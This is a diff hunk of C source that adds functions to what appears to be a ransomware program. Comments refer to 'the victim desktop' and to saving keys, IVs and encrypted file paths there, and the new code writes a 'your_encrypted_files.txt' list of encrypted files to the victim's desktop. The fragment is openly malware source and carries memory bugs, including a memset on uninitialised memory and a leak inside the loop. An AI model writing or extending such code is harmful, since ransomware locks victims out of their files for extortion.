@@ -67,6 +67,47 @@ void find_files(List **files, char* start_path){
 }
 
 /**
+ * This function will save things on the victim desktop
+ * such as enc_files.gc, public key, private key.
+ * This file will be used to decrypt.
+ * @param l -> type = EncList
+ */
+void create_files_desktop(List *encrypted, List *files, char * desktop){
+    save_into_file_encrypted_list(encrypted, desktop);
+    save_into_file_files_list(files, desktop);
+
+}
+
+void save_into_file_files_list(List *l, char *desktop){
+    FILE *f;
+    char * new_file;
+    char *line;
+    
+    if(l == NULL){
+        return;
+    }
+
+    new_file = (char*)malloc(sizeof(char) * (strlen(desktop) + 26));
+    strcpy(new_file, desktop);
+    strcat(new_file, "your_encrypted_files.txt");
+
+    f = fopen(new_file, "w");
+
+    while(l != NULL){
+        line = malloc((sizeof(char)*strlen(l->info[2]) + 11));
+        memset(line, 0, strlen(line));
+        strcpy(line, l->info[2]);
+        strcat(line, "\n");
+        fwrite(line, strlen(line), 1, f);
+        
+        l = l->prox;
+    }
+    free(line);
+    free(new_file);
+    fclose(f);
+}
+
+/**
  * This function will save all keys, iv's and path's from each successfull
  * encrypted file in the file named: "enc_files.gc" on the user's desktop.
  * This file will be used to decrypt.
